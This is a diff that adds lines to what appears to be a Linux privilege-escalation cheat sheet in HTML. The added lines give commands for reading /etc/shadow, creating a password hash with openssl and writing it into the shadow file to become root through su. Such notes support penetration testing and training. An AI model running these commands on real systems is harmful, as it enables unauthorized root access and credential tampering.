@@ -206,3 +206,11 @@ Linux Priv Checker: <a href="https://github.com/linted/linuxprivchecker">https:/
 <ul>
 <li>find / -type f -name "configurations.php" -exec ls -al {} \; 2&gt;/dev/null </li>
 </ul>
+<p> ========================================================================================================== </p>
+<ul>
+<li>cat /etc/shadow <br></br>
+openssl passwd -1 -salt abc password<br></br>
+$1$abc$BXBqpb9BZcZhXLgbee.0s/  === password<br></br>
+nano /etc/shadow  @@add-new-hash-password<br></br>
+su [root]<br></br> </li>
+</ul>
